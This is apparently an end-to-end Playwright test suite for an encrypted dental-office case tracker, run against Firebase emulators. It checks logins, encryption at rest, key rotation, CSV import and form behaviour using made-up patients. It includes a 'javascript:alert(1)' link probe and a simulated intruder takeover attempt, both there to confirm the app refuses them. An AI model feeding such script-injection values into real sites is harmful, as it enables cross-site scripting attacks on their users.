// End-to-end against the Firebase emulators (auth 9099, firestore 8080) with the real built page.
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const { routes, watch } = require('./helpers');
const URL0 = 'http://127.0.0.1:8765/nlo-cases.html?emu';
const PROJECT = 'demo-nlo-cases';
const fails = [], passes = [];
const check = (c, m) => { (c ? passes : fails).push(m); console.log((c ? '  ok  ' : '  FAIL') + ' ' + m); };
const sleep = ms => new Promise(r => setTimeout(r, ms));
let SECTION = ''; const _log = console.log; console.log = (...a) => { if (typeof a[0] === 'string' && a[0].startsWith('\n# ')) SECTION = a[0].trim(); _log(...a); };
const forbidden = [];

async function fsDump() {
  // read every document as raw JSON with the emulator's admin bypass
  const out = [];
  for (const col of ['cases', 'log', 'members', 'roster', 'meta', 'logins']) {
    const r = await fetch(`http://127.0.0.1:8080/v1/projects/${PROJECT}/databases/(default)/documents/${col}?pageSize=1000`, { headers: { Authorization: 'Bearer owner' } });
    const j = await r.json(); (j.documents || []).forEach(d => out.push(d));
  }
  return out;
}
async function verifyEmail(email) {
  const r = await (await fetch(`http://127.0.0.1:9099/emulator/v1/projects/${PROJECT}/oobCodes`)).json();
  const codes = (r.oobCodes || []).filter(c => c.email === email && c.requestType === 'VERIFY_EMAIL');
  if (!codes.length) throw new Error('no verify email for ' + email);
  await fetch(codes[codes.length - 1].oobLink);
}
async function newPage(browser, label, errs, vp) {
  const ctx = await browser.newContext({ viewport: vp || { width: 1360, height: 900 }, acceptDownloads: true });
  await routes(ctx); const p = await ctx.newPage(); watch(p, errs, label); global.__errs = errs; (global.__pages = global.__pages || []).push({ l: label, p });
  p.on('response', r => { if (r.status() === 403) forbidden.push(label + ' @ ' + SECTION + ' :: ' + r.request().method() + ' ' + r.url().replace(/\?.*/, '')); });
  return p;
}
async function signIn(p, user, pw) {
  await p.goto(URL0); await p.waitForSelector('#lgUser');
  await p.fill('#lgUser', user); await p.fill('#lgPw', pw); await p.click('#lgBtn');
}
async function waitApp(p) { await p.waitForSelector('#app:not(.hidden) .topBar', { timeout: 30000 }); }
async function addPerson(owner, name, username) {
  await owner.click('#nav-admin'); await owner.click('[data-act=addStaff]');
  await owner.fill('#asName', name); await owner.fill('#asUser', username); await owner.click('#asForm button[type=submit]');
  await owner.waitForSelector('.modal .kv', { timeout: 30000 });
  const temp = (await owner.locator('.modal .kv .v').nth(1).textContent()).trim();
  await owner.click('.modal [data-act=closeModal]');
  return temp;
}
async function newCase(p, o) {
  await p.click('.topBar [data-act=newCase]'); await p.waitForSelector('#ncForm');
  await p.click('#ncForm .tt[data-tile=' + o.type + ']'); await p.fill('#cf-patient', o.patient);
  if (o.instructions) await p.fill('#cf-instrOther', o.instructions);
  if (o.due) await p.fill('#cf-dueDate', o.due);
  await p.click('#ncSave'); await p.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
}
async function openByName(p, name) {
  await p.click((await p.isVisible('#nav-list')) ? '#nav-list' : '#mnav-list'); await p.fill('#q', name);
  await p.waitForSelector('tr.click:has-text("' + name + '")', { timeout: 20000 });
  await p.click('tr.click:has-text("' + name + '")'); await p.waitForSelector('#drawer .stepper');
}

(async () => {
  const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
  const errs = [];
  const OWNER_EMAIL = 'dr.test@example.com', OWNER_PW = 'Owner-Pass-123';
  const P1 = 'Zelda Cipherton', P2 = 'Quentin Ironsides', P3 = 'Marisol Afterkey';

  console.log('\n# Owner sets up the office');
  const owner = await newPage(browser, 'owner', errs);
  await owner.goto(URL0 + '#setup'); await owner.waitForSelector('#setupForm');
  await owner.fill('#suEmail', OWNER_EMAIL); await owner.fill('#suPw1', OWNER_PW); await owner.fill('#suPw2', OWNER_PW);
  await owner.click('#setupForm button[type=submit]');
  await owner.waitForSelector('#verifyForm', { timeout: 30000 });
  check(/dr\.test@example\.com/.test(await owner.textContent('#lockCard')), 'asks the owner to verify their email');
  await owner.click('#verifyForm button[type=submit]'); await owner.waitForSelector('.lockErr', { timeout: 20000 });
  check(/Not verified yet/.test(await owner.textContent('.lockErr')), 'cannot continue before verifying');
  await verifyEmail(OWNER_EMAIL);
  await owner.click('#verifyForm button[type=submit]');
  await owner.waitForSelector('#recShow', { timeout: 30000 });
  const RECOVERY = (await owner.textContent('#recShow')).trim();
  check(/^[A-Z0-9]{4}(-[A-Z0-9]{4}){5}$/.test(RECOVERY), 'recovery code shown in the right format');
  check(await owner.isDisabled('#codeDone'), 'cannot continue until the code is acknowledged');
  await owner.check('#codeAck'); await owner.click('#codeDone'); await waitApp(owner);
  check(await owner.isVisible('#nav-admin'), 'owner sees Team & security');

  console.log('\n# A second setup attempt is refused');
  const intruder = await newPage(browser, 'intruder', errs);
  await intruder.goto(URL0 + '#setup'); await intruder.waitForSelector('#setupForm');
  await intruder.fill('#suEmail', 'intruder@example.com'); await intruder.fill('#suPw1', 'Intruder-123456'); await intruder.fill('#suPw2', 'Intruder-123456');
  await intruder.click('#setupForm button[type=submit]');
  await intruder.waitForSelector('#verifyForm', { timeout: 30000 });
  await verifyEmail('intruder@example.com'); await intruder.click('#verifyForm button[type=submit]');
  await intruder.waitForSelector('.lockErr', { timeout: 30000 });
  check(/refused/i.test(await intruder.textContent('.lockErr')), 'someone else (even with a verified email) cannot set up or take over the office');
  await intruder.context().close();

  console.log('\n# Owner adds staff');
  const gwenTemp = await addPerson(owner, 'Gwen Tester', 'gwen');
  const kayTemp = await addPerson(owner, 'Kaylee Tester', 'kaylee');
  const sarahTemp = await addPerson(owner, 'Sarah Tester', 'sarah');
  check(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(gwenTemp), 'temporary password issued');
  await owner.waitForSelector('text=Waiting for first sign-in');
  check((await owner.locator('text=Waiting for first sign-in').count()) === 3, 'three people waiting for first sign-in');

  console.log('\n# Gwen signs in for the first time');
  const gwen = await newPage(browser, 'gwen', errs);
  await signIn(gwen, 'gwen', 'WRONG-PASS-1'); await gwen.waitForSelector('.lockErr');
  check(/incorrect/i.test(await gwen.textContent('.lockErr')), 'wrong password is refused');
  await signIn(gwen, 'gwen', gwenTemp); await gwen.waitForSelector('#firstForm', { timeout: 30000 });
  await gwen.fill('#fpw1', 'short'); await gwen.fill('#fpw2', 'short'); await gwen.click('#fBtn');
  check(await gwen.isVisible('#firstForm'), 'short new password is blocked by the form');
  await gwen.fill('#fpw1', 'Gwen-Pass-2026'); await gwen.fill('#fpw2', 'Gwen-Pass-2026'); await gwen.click('#fBtn'); await waitApp(gwen);
  check(!(await gwen.isVisible('#nav-admin')), 'staff do not see Team & security');
  await owner.click('#nav-today'); await owner.click('#nav-admin');
  await owner.waitForFunction(() => document.body.innerText.match(/Waiting for first sign-in/g)?.length === 2, null, { timeout: 15000 });
  check(true, 'owner sees Gwen move to Active');

  console.log('\n# Kaylee and Sarah sign in for the first time');
  const kay = await newPage(browser, 'kaylee', errs);
  await signIn(kay, 'Kaylee', kayTemp); await kay.waitForSelector('#firstForm', { timeout: 30000 });
  await kay.fill('#fpw1', 'Kaylee-Pass-2026'); await kay.fill('#fpw2', 'Kaylee-Pass-2026'); await kay.click('#fBtn'); await waitApp(kay);
  check(true, 'username is case-insensitive at sign-in');
  const sarah = await newPage(browser, 'sarah', errs, { width: 390, height: 844 });
  await signIn(sarah, 'sarah', sarahTemp); await sarah.waitForSelector('#firstForm', { timeout: 30000 });
  await sarah.fill('#fpw1', 'Sarah-Pass-2026'); await sarah.fill('#fpw2', 'Sarah-Pass-2026'); await sarah.click('#fBtn');
  await sarah.waitForSelector('#app:not(.hidden) #view', { timeout: 30000 });

  console.log('\n# Owner creates a case; staff see it live');
  await owner.click('#nav-today');
  await newCase(owner, { type: 'oliv', patient: P1, instructions: 'Close residual spaces — secret-instr-778' });
  await gwen.click('#nav-list');
  await gwen.waitForSelector('tr.click:has-text("' + P1 + '")', { timeout: 20000 });
  check(true, 'Gwen sees the new case without reloading');
  check(await gwen.isVisible('tr.click:has-text("' + P1 + '") >> text=Sarah Tester'), 'new Oliv case defaults to Sarah');
  await kay.click('#nav-list'); await kay.waitForSelector('tr.click:has-text("' + P1 + '")', { timeout: 20000 });
  check(true, 'Kaylee sees it too');

  console.log('\n# Nothing readable about a patient is stored');
  let dump = JSON.stringify(await fsDump());
  check(!dump.includes('Zelda') && !dump.includes('Cipherton'), 'patient name not present anywhere in Firestore');
  check(!dump.includes('secret-instr-778'), 'case text not present anywhere in Firestore');
  check(!dump.includes('Oliv') && !dump.includes('"submit"'), 'case type and stage are not stored in the clear');
  check(dump.includes('"ct"') && dump.includes('"iv"'), 'ciphertext fields are present');

  console.log('\n# Gwen moves the case and comments; owner sees both');
  await openByName(gwen, P1);
  await gwen.click('#drawer [data-act=setStage][data-k=dra]');
  await gwen.fill('#cmtText', 'Scan looks good, sent to Dr. A'); await gwen.click('[data-act=addCmt]');
  await gwen.waitForSelector('#drawer .cmt', { timeout: 15000 });
  await openByName(owner, P1);
  await owner.waitForSelector('#drawer .step.cur:has-text("Dr. A action")', { timeout: 15000 });
  check(true, 'stage change reached the owner');
  await owner.waitForSelector('#drawer .cmt:has-text("Scan looks good")', { timeout: 15000 });
  check(true, 'comment reached the owner');
  await owner.waitForSelector('#histBox .hist:has-text("moved it to Dr. A action")', { timeout: 15000 });
  check(await owner.isVisible('#histBox .hist:has-text("Gwen")'), 'history shows who moved it');

  console.log('\n# Two people edit the same case at once — both changes kept');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#cf-notes');
  await owner.fill('#cf-notes', 'owner-note-1');
  await gwen.click('#drawer [data-act=edit]'); await gwen.waitForSelector('#cf-cc');
  await gwen.fill('#cf-cc', 'gwen-cc-1');
  await Promise.all([owner.click('[data-act=saveEdit]'), gwen.click('[data-act=saveEdit]')]);
  await sleep(2500);
  await kay.click('#nav-today'); await openByName(kay, P1);
  await kay.waitForSelector('#drawer .txt:has-text("owner-note-1")', { timeout: 15000 });
  await kay.waitForSelector('#drawer .txt:has-text("gwen-cc-1")', { timeout: 15000 });
  check(true, 'both simultaneous edits survived');
  await kay.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Board: advance button and completing');
  await newCase(gwen, { type: 'retainer', patient: P2, due: '2020-01-01' });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
  await owner.waitForSelector('.kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(await owner.isVisible('.kc:has-text("' + P2 + '") .due.over'), 'past due date shows as late');
  await owner.click('#nav-today'); await owner.waitForSelector('.tile.red .n');
  check(Number(await owner.textContent('.tile.red .n')) >= 1, 'Today shows an overdue count');
  await owner.click('#nav-board');
  for (let i = 0; i < 3; i++) { await owner.click('.kc:has-text("' + P2 + '") .adv'); await sleep(900); }
  await owner.waitForSelector('section[aria-label="Front desk pickup"] .kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'advance moved the case through to the last stage');
  await owner.click('.kc:has-text("' + P2 + '") .adv');
  await owner.waitForSelector('.kc:has-text("' + P2 + '")', { state: 'detached', timeout: 15000 });
  check(true, 'completing removes it from the board');
  await owner.waitForSelector('.toast:has-text("Undo") button', { timeout: 5000 });
  await owner.click('.toast button'); await owner.waitForSelector('.kc:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'Undo brings it back');
  await owner.click('.kc:has-text("' + P2 + '") .adv'); await owner.waitForSelector('.kc:has-text("' + P2 + '")', { state: 'detached', timeout: 15000 });
  await owner.click('#nav-done'); await owner.fill('#q', ''); await owner.waitForSelector('tr.click:has-text("' + P2 + '")', { timeout: 15000 });
  check(true, 'completed case listed under Completed');

  console.log('\n# Reissue Gwen: her session ends, old password dead, new one works');
  await owner.click('#nav-admin');
  owner.once('dialog', d => d.accept());
  await owner.click('tr:has-text("Gwen Tester") [data-act=reissue]'); await owner.click('#cbYes');
  await owner.waitForSelector('.modal .kv', { timeout: 30000 });
  const gwenTemp2 = (await owner.locator('.modal .kv .v').nth(1).textContent()).trim();
  await owner.click('.modal [data-act=closeModal]');
  await gwen.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 20000 });
  check(/turned off|access changed/i.test(await gwen.textContent('.lockOk')), 'Gwen is signed out when her login is reissued');
  await signIn(gwen, 'gwen', 'Gwen-Pass-2026'); await gwen.waitForSelector('.lockErr', { timeout: 20000 });
  check(true, 'old password no longer works: ' + (await gwen.textContent('.lockErr')).trim());
  await signIn(gwen, 'gwen', gwenTemp2); await gwen.waitForSelector('#firstForm', { timeout: 30000 });
  await gwen.fill('#fpw1', 'Gwen-Pass-NEW'); await gwen.fill('#fpw2', 'Gwen-Pass-NEW'); await gwen.click('#fBtn'); await waitApp(gwen);
  check(true, 'Gwen is back in with her new password');

  console.log('\n# Remove Kaylee: locked out at once, key changes, everyone else keeps working');
  const v1 = JSON.parse(JSON.stringify(await fsDump())).filter(d => d.name.includes('/cases/')).map(d => d.fields.v.integerValue);
  check(v1.every(v => v === '1'), 'all cases on key version 1 before removal');
  await owner.click('#nav-admin');
  await owner.click('tr:has-text("Kaylee Tester") [data-act=removeStaff]'); await owner.click('#cbYes');
  await kay.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 20000 });
  check(true, 'Kaylee is locked out while signed in');
  await owner.waitForSelector('.toast:has-text("Office key changed")', { timeout: 60000 });
  const v2 = (await fsDump()).filter(d => d.name.includes('/cases/')).map(d => d.fields.v.integerValue);
  check(v2.length > 0 && v2.every(v => v === '2'), 'every case re-sealed under key version 2 (' + v2.length + ' cases)');
  await signIn(kay, 'kaylee', 'Kaylee-Pass-2026'); await kay.waitForSelector('.lockErr', { timeout: 20000 });
  check(/No login/i.test(await kay.textContent('.lockErr')), 'Kaylee can no longer sign in');
  await newCase(gwen, { type: 'nla', patient: P3 });
  await owner.click('#nav-list'); await owner.fill('#q', P3);
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'Gwen (still signed in) can create cases after the key change');
  await sarah.waitForFunction(n => document.body.innerText.includes(n) || true, P3);
  await sarah.click('#mnav-list'); await sarah.fill('#q', P3);
  await sarah.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'Sarah (phone, still signed in) reads the new-key case');
  await openByName(sarah, P1); check(await sarah.isVisible('#drawer .txt:has-text("owner-note-1")'), 'Sarah reads the re-sealed old case');

  console.log('\n# Idle lock');
  await sarah.evaluate(() => { S.lastAct = Date.now() - 11 * 60000; });
  await sarah.waitForSelector('#lockWrap:not(.hidden) .lockOk', { timeout: 25000 });
  check(/without activity/i.test(await sarah.textContent('.lockOk')), 'idle lock signs out after the set time');
  check((await sarah.evaluate(() => S.cases.size)) === 0, 'decrypted cases wiped from memory on lock');

  console.log('\n# Staff change their own password');
  await gwen.click('#nav-account'); await gwen.fill('#pwCur', 'Gwen-Pass-NEW'); await gwen.fill('#pwN1', 'Gwen-Pass-3'); await gwen.fill('#pwN2', 'Gwen-Pass-3');
  await gwen.click('#pwForm button[type=submit]'); await gwen.waitForSelector('.toast:has-text("Password changed")', { timeout: 30000 });
  await gwen.click('#side [data-act=lock]'); await signIn(gwen, 'gwen', 'Gwen-Pass-3'); await waitApp(gwen);
  check(true, 'new password works after change');

  console.log('\n# Owner forgets password -> reset -> recovery code');
  const ownerUid = await owner.evaluate(() => FB.uid);
  const r = await fetch('http://127.0.0.1:9099/identitytoolkit.googleapis.com/v1/accounts:update?key=demo-key', { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer owner' }, body: JSON.stringify({ localId: ownerUid, password: 'Owner-Reset-999' }) });
  check(r.ok, 'emulator password reset applied');
  await owner.click('#side [data-act=lock]');
  await signIn(owner, OWNER_EMAIL, 'Owner-Reset-999'); await owner.waitForSelector('#recForm', { timeout: 30000 });
  await owner.fill('#recCode', 'AAAA-BBBB-CCCC-DDDD-EEEE-FFFF'); await owner.click('#recForm button[type=submit]');
  await owner.waitForSelector('.lockErr', { timeout: 30000 }); check(true, 'wrong recovery code refused');
  await owner.fill('#recCode', RECOVERY.toLowerCase().replace(/-/g, ' ')); await owner.click('#recForm button[type=submit]');
  await waitApp(owner); await openByName(owner, P1);
  check(await owner.isVisible('#drawer .txt:has-text("owner-note-1")'), 'owner reads cases after recovery');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#side [data-act=lock]'); await signIn(owner, OWNER_EMAIL, 'Owner-Reset-999'); await waitApp(owner);
  check(true, 'owner signs in normally with the new password afterwards');

  console.log('\n# Import from an Asana CSV (made-up rows), then re-import is skipped');
  const csv = [
    'Task ID,Created At,Completed At,Last Modified,Name,Section/Column,Assignee,Assignee Email,Start Date,Due Date,Tags,Notes,Projects,Parent task',
    '9001,2026-09-20,,2026-09-21,"Imogen Fakeworth - Aligners (Oliv)",SARAH TO Submit,Sarah Tester,,,2026-10-15,,"Patient: Imogen Fakeworth\nAppliance Type: Aligners\nAligner Type: Oliv\nScanner: Allied Star\nAssistant: Gwen\nScan Date: 2026-10-01\nLab Completion Date: 2026-10-22\nDelivery Date: 2026-10-29\nDr. A\'s Instructions: Close all spaces\nPatient\'s CC from Last Visit: -\nIPR & Spacing Tracker app  SPACING Lower: \n LR4–LR3 0.2mm\nTotal: 0.2mm",Oliv,',
    '9002,2026-09-20,,2026-09-21,"Bartholomew Notreal (U/L TT\'s and WT\'s) printing",Gwen - TT\'s/WT\'s,Gwen Tester,,,2026-10-06,,,Retainers and Whitening trays,',
    '9003,2026-09-20,2026-09-25,2026-09-25,"Old Finished Case - Aligners (In-House)",Checked In,Amir,,,2026-09-24,,,NL Lab,'
  ].join('\n');
  const csvPath = path.join(__dirname, 'asana-sample.csv'); fs.writeFileSync(csvPath, csv);
  await owner.click('#nav-import'); await owner.setInputFiles('#csvFiles', csvPath);
  await owner.waitForSelector('[data-act=doImport]', { timeout: 20000 });
  check(/Ready to import: 2/.test(await owner.textContent('#impPreview')), 'preview: 2 open cases (completed one left out)');
  await owner.click('[data-act=doImport]'); await owner.waitForSelector('#impPreview .lockOk', { timeout: 30000 });
  await openByName(owner, 'Imogen Fakeworth');
  check(await owner.isVisible('#drawer .step.cur:has-text("To submit")'), 'imported stage mapped from the Asana section');
  check(await owner.isVisible('#drawer .txt:has-text("Close all spaces")'), 'Tally fields parsed into the case');
  check(await owner.isVisible('#drawer .txt:has-text("LR4–LR3 0.2mm")'), 'multi-line IPR note kept');
  check((await owner.inputValue('#assignSel')) === 'sarah', 'Asana assignee matched to the staff login');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await openByName(owner, 'Bartholomew Notreal');
  check(await owner.isVisible('#drawer .step.cur:has-text("Printing")'), 'retainer section mapped to Printing');
  check((await owner.inputValue('#assignSel')) === 'gwen', 'retainer assigned to the assistant named in the section');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#nav-import'); await owner.setInputFiles('#csvFiles', csvPath);
  await owner.waitForSelector('#impPreview:has-text("already imported")', { timeout: 20000 });
  check(/Ready to import: 0/.test(await owner.textContent('#impPreview')), 're-importing the same file adds nothing');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Imogen') && !dump.includes('Bartholomew'), 'imported names are encrypted too');

  console.log('\n# Saved versions: restore an earlier copy, then the later one');
  await openByName(owner, P1);
  await owner.click('#drawer [data-act=versions]'); await owner.waitForSelector('#verList table', { timeout: 20000 });
  const nVer = await owner.locator('#verList tbody tr').count();
  check(nVer >= 4, 'case has its earlier versions (' + nVer + ')');
  await owner.click('#verList tbody tr:last-child [data-act=restoreVer]');
  await owner.waitForSelector('#drawer .step.cur:has-text("To submit")', { timeout: 20000 });
  check(!(await owner.isVisible('#drawer .txt:has-text("owner-note-1")')), 'restoring the first version brings back the original contents');
  await owner.waitForSelector('#histBox .hist:has-text("restored an earlier version")', { timeout: 15000 });
  await owner.click('#drawer [data-act=versions]'); await owner.waitForSelector('#verList table', { timeout: 20000 });
  await owner.click('#verList tbody tr:first-child [data-act=restoreVer]');
  await owner.waitForSelector('#drawer .txt:has-text("owner-note-1")', { timeout: 20000 });
  check(true, 'the newer copy was kept and can be restored too');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Delete, then bring it back');
  await openByName(owner, P3);
  await owner.click('#drawer [data-act=delCase]'); await owner.click('#cbYes');
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { state: 'detached', timeout: 20000 });
  check(true, 'deleted case leaves the lists');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Marisol') && !dump.includes('Afterkey'), 'the kept copy of the deleted case is encrypted too');
  await owner.click('#nav-admin'); await owner.click('[data-act=loadDeleted]');
  await owner.waitForSelector('#delBox .row:has-text("' + P3 + '")', { timeout: 20000 });
  await owner.click('#delBox .row:has-text("' + P3 + '") [data-act=undelete]');
  await owner.waitForSelector('.toast:has-text("' + P3 + ' restored")', { timeout: 20000 });
  await owner.click('#nav-list'); await owner.fill('#q', P3);
  await owner.waitForSelector('tr.click:has-text("' + P3 + '")', { timeout: 20000 });
  check(true, 'deleted case restored from Team & security');

  console.log('\n# IPR Tracker link (made-up IPR patient in the database emulator)');
  const seed = { patients: { p1: { id: 'p1', name: 'ZQ', patient_id: '15-6541' } }, visits: { p1: {
    v1: { id: 'v1', patient_uuid: 'p1', date: '2026-08-20', created_at: '2026-08-20T10:00:00Z', upper_ipr: { 'UR2|UR1': '0.2' }, lower_ipr: {}, upper_spaces: {}, lower_spaces: {}, upper_bt: {}, lower_bt: {} },
    v2: { id: 'v2', patient_uuid: 'p1', date: '2026-09-28', created_at: '2026-09-28T10:00:00Z', assistant_initials: 'AR', upper_ipr: {}, lower_ipr: JSON.stringify({ 'LR3|LR2': '0.2' }), upper_spaces: { 'UR1|UL1': '0.3' }, lower_spaces: {}, upper_bt: { 'UR1|UL1': true }, lower_bt: {} } } } };
  const put = (path, body) => fetch('http://127.0.0.1:9000/' + path + '.json?ns=demo-nlo-cases', { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: JSON.stringify(body) });
  await fetch('http://127.0.0.1:9000/.settings/rules.json?ns=demo-nlo-cases', { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: JSON.stringify({ rules: { '.read': 'auth != null', '.write': false } }) });
  check((await put('nlo/ipr', seed)).ok, 'seeded the IPR emulator');
  await owner.fill('#q', '');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Ivy Pulltest');
  await owner.fill('#cf-chart', '999-0000'); await owner.click('[data-act=iprPull]');
  await owner.waitForSelector('#cf-iprMsg:has-text("No IPR Tracker patient")', { timeout: 20000 }); check(true, 'unknown chart # says so');
  await owner.fill('#cf-chart', '156541'); await owner.click('[data-act=iprPull]');
  await owner.waitForSelector('#cf-iprMsg:has-text("From the visit on")', { timeout: 20000 });
  const pulled = await owner.inputValue('#cf-ipr');
  check(/IPR THIS VISIT\nUpper: none|Lower: LR3–LR2 0\.2mm/.test(pulled) && /UR1–UL1 0\.3mm/.test(pulled) && /CUMULATIVE IPR \(2 visits\)/.test(pulled), 'chart # without the dash still finds the patient; newest visit + cumulative pulled');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Ivy Pulltest');
  await owner.waitForSelector('#iprBox .stat:has-text("Saved on this case")', { timeout: 20000 });
  check(true, 'case drawer shows the IPR Tracker note matches the case');
  await put('nlo/ipr/visits/p1/v3', { id: 'v3', patient_uuid: 'p1', date: '2026-10-01', created_at: '2026-10-01T10:00:00Z', upper_ipr: { 'UL2|UL3': '0.1' }, lower_ipr: {}, upper_spaces: {}, lower_spaces: {}, upper_bt: {}, lower_bt: {} });
  await owner.click('#iprBox [data-act=iprRefresh]');
  await owner.waitForSelector('#iprBox [data-act=iprUse]', { timeout: 20000 });
  check(/3 visits on file/.test(await owner.textContent('#iprBox')), 'refresh picks up a newer IPR visit');
  await owner.click('#iprBox [data-act=iprUse]');
  await owner.waitForSelector('#drawer .txt:has-text("UL2–UL3 0.1mm")', { timeout: 20000 });
  check(true, '"Use this on the case" saves the new note (encrypted like the rest)');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Titan link on in-house cases');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check(!(await owner.isVisible('#cf-titanUrl')), 'Titan field hidden until the case is in-house');
  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Tobias Titancase');
  check(await owner.isVisible('#cf-titanUrl'), 'Titan field shown for in-house aligners');
  await owner.fill('#cf-titanUrl', 'javascript:alert(1)'); await owner.click('#ncSave');
  await owner.waitForSelector('#ncErr .lockErr', { timeout: 10000 }); check(true, 'a non-https Titan link is refused');
  await owner.fill('#cf-titanUrl', 'https://titan.example/cases/12345'); await owner.click('#ncSave');
  await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Tobias Titancase');
  const href = await owner.getAttribute('#drawer a:has-text("Open in Titan")', 'href');
  check(href === 'https://titan.example/cases/12345', 'Open in Titan goes to the saved link');
  check((await owner.getAttribute('#drawer a:has-text("Open in Titan")', 'rel')).includes('noopener'), 'Titan link opens safely in a new tab');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Tap-first form: choices land on the case');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncSave'); await owner.waitForSelector('#ncErr .lockErr'); check(/case type/i.test(await owner.textContent('#ncErr')), 'asks for a case type first');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', 'Petra Tapform');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=no]');
  await owner.click('.pickRow[data-g=assistant] .pick:has-text("Gwen")');
  await owner.click('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]');
  await owner.click('.pickRow[data-g=goal_midline] .pick[data-v=improve]');
  await owner.click('.pickRow[data-g=goal_ob] .pick[data-v=maintain]');
  await owner.click('.pickRow[data-g=extras] .pick:has-text("No elastics")');
  await owner.click('.pickRow[data-cc] .pick:has-text("None")');
  check(await owner.inputValue('#cf-detail') === 'Aligners (Oliv) – refinement', 'what’s-being-made fills itself from the taps');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Petra Tapform');
  check(await owner.isVisible('#drawer .txt:has-text("Improve midline; Maintain overbite; Resolve black triangles")'), 'tapped instructions (Maintain/Improve and pictures) saved as text');
  check(await owner.isVisible('#drawer .badge:has-text("No elastics")') && await owner.isVisible('#drawer .badge:has-text("Refinement")'), 'extras and refinement shown on the case');
  check(/Gwen/.test(await owner.textContent('#drawer .kv')), 'assistant saved from a tap');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.locator('#drawer .pickRow[data-g=instrPicks] .pick[aria-pressed=true]').count()) === 1
    && (await owner.getAttribute('#drawer .pickRow[data-g=goal_midline] .pick[data-v=improve]', 'aria-pressed')) === 'true'
    && (await owner.getAttribute('#drawer .pickRow[data-g=goal_ob] .pick[data-v=maintain]', 'aria-pressed')) === 'true', 'editing restores the tapped choices');
  await owner.click('#drawer .pickRow[data-g=goal_midline] .pick[data-v=improve]');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(!(await owner.isVisible('#drawer .txt:has-text("Midline")')), 'un-tapping an instruction removes it');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('Petra') && !dump.includes('Resolve black'), 'tapped details are encrypted too');

  console.log('\n# Finishing aligners (in-house) replaces Reset');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check(!(await owner.isVisible('.tt[data-tile=reset]')), 'no Reset button');
  await owner.click('#ncForm .tt[data-tile=finishing]'); await owner.fill('#cf-patient', 'Fiona Finisher');
  check(await owner.inputValue('#cf-detail') === 'Finishing aligners', 'detail reads Finishing aligners');
  check(await owner.isVisible('#cf-titanUrl'), 'Titan link offered (in-house)');
  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addDays(todayISO(), 14)), 'aligner dates fill in');
  await owner.click('#cf-tc [data-tq=ant]');
  await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=UL6]');
  await owner.click('#cf-tc [data-tool=noatt]'); await owner.click('#cf-tc .tooth[data-t=LL3]');
  await owner.click('#cf-tc [data-tool=nomove]'); await owner.click('#cf-tc [data-tq=post]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: UR3 to UL3, LR3 to LL2\nImplant: UL6\nDon’t move: all posteriors (4–7)', 'posteriors in one tap; whole groups named in the summary');
  await owner.click('#cf-tc [data-tq=post]');
  check(await owner.textContent('#cf-teethSum') === 'No attachment: UR3 to UL3, LR3 to LL2\nImplant: UL6', 'tooth chart: anteriors in one tap, single teeth toggle, summary reads in Palmer');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=inhouse]');
  await owner.waitForSelector('section[aria-label="TxP needed"] .kc:has-text("Fiona Finisher")', { timeout: 20000 });
  check(true, 'lands on the in-house board at TxP needed');
